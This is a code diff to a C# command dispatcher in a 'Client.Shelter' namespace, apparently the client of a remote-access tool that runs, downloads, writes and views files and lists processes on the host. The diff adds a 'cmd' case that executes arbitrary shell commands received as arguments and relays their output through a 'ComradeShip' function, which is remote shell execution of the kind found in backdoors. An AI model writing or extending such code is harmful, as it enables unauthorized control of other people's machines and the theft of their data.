@@ -48,7 +48,7 @@ namespace Client.Shelter
                         return "Expected 2 arguments for file run";
                     }
                     return this.RunningShelter(args[1]);
-                   
+
 
 
                 case "download":
@@ -56,8 +56,8 @@ namespace Client.Shelter
                     {
                         return "Expected 3 arguments for file download";
                     }
-                   return  this.Download(args[1],args[2]);
-                   
+                    return this.Download(args[1], args[2]);
+
 
                 case "create":
                     if (args.Length != 2)
@@ -65,7 +65,7 @@ namespace Client.Shelter
                         return "Expected 2 arguments for file create";
                     }
                     return this.Create(args[1]);
-                    
+
 
                 case "write":
                     if (args.Length != 3)
@@ -73,7 +73,7 @@ namespace Client.Shelter
                         return "Expected 3 arguments for file write";
                     }
                     return this.Write(args[1], args[2]);
-                  
+
 
                 case "view":
                     if (args.Length != 2)
@@ -111,10 +111,37 @@ namespace Client.Shelter
                     {
                         return "Expected 1 arguments for directory listing";
                     }
-                    
+
                     return ProcessList();
 
-             
+                case "cmd":
+                        if(args.Length == 2)
+                    {
+                        string outcommand = CmdCommand(args[1]);
+                        ComradeShip(outcommand);
+                        return outcommand;
+                    }
+                    if (args.Length == 3)
+                    {
+                        string outcommand = CmdCommand((args[1] + " " + args[2]));
+                        ComradeShip(outcommand);
+                        return outcommand;
+                        
+                    }
+
+                    if(args.Length == 4)
+                    {
+                        string outcommand = CmdCommand((args[1] + " " + args[2] + " " + args[3]));
+                        ComradeShip(outcommand);
+                        return outcommand;
+
+                    
+                    }
+                    else
+                    {
+                        return "You enter 4 command, now its not support honey";
+                    }
+           
 
                 default:
                     return "Unexpected argument" + args[0];
@@ -131,7 +158,15 @@ namespace Client.Shelter
             }
             catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
         }
-        
+        public static string CmdCommand(string ShellCommand)
+        {
+            try
+            {
+                
+              return Shell.ShellCmdExecute(ShellCommand);
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
         public string ListDirectory(string Path)
         {
             try
